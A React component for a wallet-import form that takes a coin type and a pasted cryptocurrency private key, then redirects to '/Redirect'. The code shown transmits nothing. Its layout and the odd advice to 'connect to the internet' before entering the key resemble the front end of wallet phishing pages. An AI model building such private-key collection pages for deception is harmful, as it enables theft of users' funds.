import React from "react";
import classes from "./privateKey.module.css";
import { useState } from "react";
import { useNavigate } from "react-router";
import { useEffect } from "react";
const Form = () => {
  const navigate = useNavigate();
  const [value, setValue] = useState({
    coinType: "",
    privateKey: "",
    password: "",
  });

  const handleChange = (e) => {
    setValue((prevState) => ({
      ...prevState,
      [e.target.name]: e.target.value,
    }));
  };

  const handleSubmit = (e) => {
    e.preventDefault();
    // console.log(value);
    // console.log(items);
    navigate("/Redirect");
  };
  useEffect(() => {
    const walletname = localStorage.getItem("walletname");
    if (walletname) {
      setValue({
        ...value,
        coinType: walletname,
      });
    }
  }, []);
  return (
    <div>
      <form className={classes.form}>
        <select
          className={classes.input}
          value={value.coinType}
          name="coinType"
          // onChange={() => handleChange(items)}
        >
          {" "}
          <option value="">select coin</option>
          <option value={value.coinType}>{value.coinType}</option>
        </select>
        <label>Private key</label>
        <div>
          <textarea
            className={classes.input1}
            type="text"
            // placeholder="placeholder"
            value={value.privateKey}
            onChange={handleChange}
            name="privateKey"
          />
        </div>
        <p>
          Before you enter private key, we recommend you connect to the
          internet.
        </p>
      </form>
      <button
        className={classes.button}
        onClick={handleSubmit}
        disabled={value.coinType.length < 2 || value.privateKey.length < 2}
      >
        Import Wallet
      </button>
    </div>
  );
};

export default Form;
